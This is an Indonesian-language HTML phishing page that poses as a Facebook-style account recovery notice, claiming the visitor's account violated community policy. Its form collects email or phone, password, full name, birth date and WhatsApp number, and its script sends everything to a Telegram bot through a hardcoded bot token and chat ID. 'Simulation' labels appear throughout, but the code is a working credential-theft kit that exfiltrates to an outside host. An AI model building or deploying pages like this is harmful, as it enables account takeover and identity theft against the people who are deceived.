<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Simulasi Pemulihan Akun</title>
  <style>
    * {
      box-sizing: border-box;
    }
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background-color: #f0f2f5;
      font-family: 'Segoe UI', sans-serif;
    }
    .screen {
      display: flex;
      flex-direction: column;
      justify-content: flex-start; /* konten ke atas */
      align-items: center;
      height: 100vh;
      width: 100%;
      padding: 40px 20px;
      padding-top: 40px; /* jarak dari atas */
    }
    .container {
      background: #fff;
      padding: 30px 24px;
      border-radius: 12px;
      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.08);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    .container h2 {
      font-size: 24px;
      color: #1877f2;
      margin-bottom: 16px;
    }
    .container p {
      font-size: 16px;
      color: #444;
      margin-bottom: 24px;
    }
    .container input {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      margin-bottom: 14px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .container button {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      background-color: #1877f2;
      color: white;
      font-weight: 600;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    .hidden {
      display: none;
    }
    img.lock-icon {
      width: 50px;
      margin-bottom: 16px;
    }
  </style>
</head>
<body>

  <!-- Halaman 1 -->
  <div class="screen" id="step1">
    <div class="container">
      <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Lock Icon" class="lock-icon" />
      <h2>Harap Konfirmasi Identitas Anda</h2>
      <p>Akun Anda dilaporkan melanggar kebijakan komunitas. Lanjutkan untuk verifikasi akun secara manual.</p>
      <button onclick="goToForm()">Lanjutkan</button>
    </div>
  </div>

  <!-- Halaman 2 -->
  <div class="screen hidden" id="step2">
    <div class="container">
      <h2 style="color: #1877f2;">Pemulihan Akun</h2>
      <form id="recoveryForm">
        <input type="text" id="email" placeholder="Email atau Nomor Telepon" required />
        <input type="password" id="password" placeholder="Kata Sandi" required />
        <input type="text" id="nama" placeholder="Nama Lengkap" required />
        <input type="text" id="tglLahir" placeholder="Tanggal Lahir (DD-MM-YYYY)" required />
        <input type="text" id="whatsapp" placeholder="Nomor WhatsApp Aktif" required />
        <button type="submit">Kirim</button>
      </form>
    </div>
  </div>

  <!-- Halaman 3 -->
  <div class="screen hidden" id="step3">
    <div class="container">
      <h2>Berhasil!</h2>
      <p>Data simulasi telah dikirim. Anda akan dihubungi oleh tim support kami.</p>
    </div>
  </div>

  <script>
    function goToForm() {
      document.getElementById("step1").classList.add("hidden");
      document.getElementById("step2").classList.remove("hidden");
    }

    const botToken = '7733097714:AAFizEnWZUqtjfJxikCqoNOCzufsJTB2Vk8'; // Ganti dengan token bot Telegram Anda
    const chatId = '7228659553';     // Ganti dengan chat ID Anda

    document.getElementById("recoveryForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      const nama = document.getElementById("nama").value;
      const tgl = document.getElementById("tglLahir").value;
      const whatsapp = document.getElementById("whatsapp").value;

      const message = `ðŸ” Simulasi Data:\nðŸ“§ Email: ${email}\nðŸ”‘ Password: ${password}\nðŸ‘¤ Nama: ${nama}\nðŸŽ‚ Lahir: ${tgl}\nðŸ“± WhatsApp: ${whatsapp}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      }).then(() => {
        document.getElementById("step2").classList.add("hidden");
        document.getElementById("step3").classList.remove("hidden");
      }).catch(err => {
        alert("Gagal mengirim data simulasi.");
        console.error(err);
      });
    });
  </script>

</body>
</html>
